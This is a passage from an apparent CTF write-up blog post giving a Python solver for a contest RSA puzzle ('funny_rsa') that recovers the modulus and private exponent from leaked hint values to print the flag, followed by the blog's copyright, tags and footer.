<h3 id="funny-rsa"><a href="#funny-rsa" class="headerlink" title="funny_rsa"></a>funny_rsa</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">funny1=-<span class="number">17696257697673533517695215344482784803953262308315416688683426036407670627060768442028628137969719289734388098357659521255966031131390425549974547376165392147394271974280020234101031837837842620775164967619688351222631803585213762205793801828461058523503457022704948803795360591719481537859524689187847958423587638744086265395438163720708785636319741908901866136858161996560525252461619641697255819255661269266471689541673348377717503957328827459396677344554172542244540931545166846117626585580964318010181586516365891413041095399344533013057011854734701706641516027767197631044458866554524544179750101814734153116374</span></span><br><span class="line">funny2=<span class="number">23686728880494758233026798487859622755203105120130180108222733038275788082047755828771429849079142070779731875136837978862880500205129022165600511611807590195341629179443057553694284913974985006590617143873019530710952420242412437467917519539591683898715990297750494900923245055632544763410401540518654522017115269508183482044872091052235608170710105631742176900306097734799793264202179181242015892763311753674799273300604804820015447161950996038795518844564861004398396796284113803759208011</span></span><br><span class="line">funny3=<span class="number">419166458284161364374927086939132546372091965414091344286510440034452974193054721041229068769658972346759176374539266235862042787888391905466876330331208651698002159575012622762558316612596034044109738533275009086940744966244759977014078484433213617582101347769476703012517531619023366639507114909172774156647998737369356116119513795863130218094614475699956104117183821832339358478426978211282822163928764161915824622224165694904342224081321345691796882691318330781141960650263488927837990954860719950761728580780956673732592771855694502630374907978111094148614378212006604233062606116168868545120407836000858982789824582335703891535021579560434875457656655941164757860852341484554015214879991896412137447010444797452119431147303295803678311972500421396900616845556636124424993090559354406417222700637726789045926994792374756038517484548544506630672251868349748176389591615802039026216656891403871728516658502023897343287181822303758976641229952646993446276281728919020747050486979968215989594984778920359425264076558022228448529089047021814759587052098774273578311709416672952218680244714492318709603579024</span></span><br><span class="line">funny4=<span class="number">13541898381047120826573743874105965191304100799517820464813250201030319771155430755606644860103469823030581858410957600027665504533335597988508084284252510961847999525811558651340906333101248760970154440885012717108131962658921396549020943832983712611749095468180648011521808106480590665594160479324931351996812185581193608244652792936715504284312172734662364676167010674359243219959129435127950232321130725013160026977752389409620674167037650367196748592335698164875097139931376389630867192761783936757260359606379088577977154378217235326249540098268616890307702288393952949444753648206049856544634755301197410481479</span></span><br><span class="line">n=(funny3+<span class="number">1025</span>)//funny2</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">d_values = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(-<span class="number">1025</span>, <span class="number">1026</span>):</span><br><span class="line">    phi = -funny1 + i + <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> phi &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            d = inverse(e, phi)</span><br><span class="line">            d_values.append(d)</span><br><span class="line">        <span class="keyword">except</span> ValueError:            </span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">for</span> d <span class="keyword">in</span> d_values:</span><br><span class="line">    hint = <span class="built_in">pow</span>(funny4, d, n)</span><br><span class="line">    m = funny2 // hint</span><br><span class="line">    flag=long_to_bytes(m)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;flag&#x27;</span><span class="keyword">in</span> flag:</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>


        </div>

        
            <section class="post-copyright">
                
                    <p class="copyright-item">
                        <span>Author:</span>
                        <span>viol1t</span>
                    </p>
                
                
                    <p class="copyright-item">
                        <span>Permalink:</span>
                        <span><a href="https://viol1t.com/2025/01/24/2025%E5%B9%B4%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9Bwp/">https://viol1t.com/2025/01/24/2025%E5%B9%B4%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9Bwp/</a></span>
                    </p>
                
                
                    <p class="copyright-item">
                        <span>License:</span>
                        <span>Copyright (c) 2023 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
                    </p>
                
                
                     <p class="copyright-item">
                         <span>Slogan:</span>
                         <span>Do you believe in <strong>DESTINY</strong>?</span>
                     </p>
                

            </section>
        
        <section class="post-tags">
            <div>
                <span>Tag(s):</span>
                <span class="tag">
                    
                    
                        <a href="/tags/pwn/"># pwn</a>
                    
                        <a href="/tags/web/"># web</a>
                    
                        <a href="/tags/re/"># re</a>
                    
                        <a href="/tags/crypto/"># crypto</a>
                    
                        <a href="/tags/misc/"># misc</a>
                    
                        
                </span>
            </div>
            <div>
                <a href="javascript:window.history.back();">back</a>
                <span>· </span>
                <a href="/">home</a>
            </div>
        </section>
        <section class="post-nav">
            
            
            <a class="next" rel="next" href="/2025/01/18/2025%E5%B9%B4%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%88%9D%E8%B5%9Bwp/">2025年西湖论剑初赛wp</a>
            
        </section>


    </article>
</div>

            </div>
            <footer id="footer" class="footer">
    <div class="copyright">
        <span>© viol1t | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
    </div>
</footer>

    </div>
</body>

</html>